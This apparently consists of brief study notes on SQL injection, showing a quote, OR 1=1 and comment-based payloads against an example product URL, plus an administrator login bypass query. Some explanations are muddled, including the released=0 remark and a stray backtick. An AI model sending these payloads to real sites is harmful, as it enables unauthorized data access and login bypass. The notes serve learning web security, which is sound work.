# SQL Injection

* `'`. `OR 1=1`, `OR 1=2`
* `WHERE` and `SELECT` are the most common. 


By adding `released=0`, it returns all products, including unreleased ones. 
* `https://example.com/products?category=Gifts`
* `SELECT * FROM products WHERE category = 'Gifts' AND released = 0`



A comment indicator `--` comments out anything after. As a result, it returns all products. 

* `https://example.com/products?category=Gifts'--`
* `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 0`


This also returns all products.

* `https://example.com/products?category=Gifts'+OR+1=1--`
* `SELECT * FROM products WHERE category = 'Gifts' OR 1=1` AND released = 0`
* `SELECT * FROM users WHERE username = 'administrator'--' AND password = ' ' `
